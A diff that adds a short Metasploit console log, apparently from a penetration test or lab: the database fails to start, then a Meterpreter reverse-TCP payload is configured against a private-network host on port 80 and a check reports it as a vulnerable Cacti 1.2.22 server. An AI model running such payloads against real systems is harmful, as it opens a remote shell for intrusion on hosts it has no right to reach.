@@ -1,0 +1,12 @@
+Running the 'init' command for the database:
+Existing database found, attempting to start it
+Starting database at /home/yoan/snap/metasploit-framework/common/.msf4/db...waiting for server to start.... stopped waiting
+pg_ctl: could not start server
+Examine the log output.
+failed
+This copy of metasploit-framework is more than two weeks old.
+ Consider running 'msfupdate' to update to the latest version.
+[*] Using configured payload linux/x86/meterpreter/reverse_tcp
+RHOSTS => 10.33.102.225
+RPORT => 80
+[*] 10.33.102.225:80 - The target appears to be vulnerable. The target is Cacti version 1.2.22
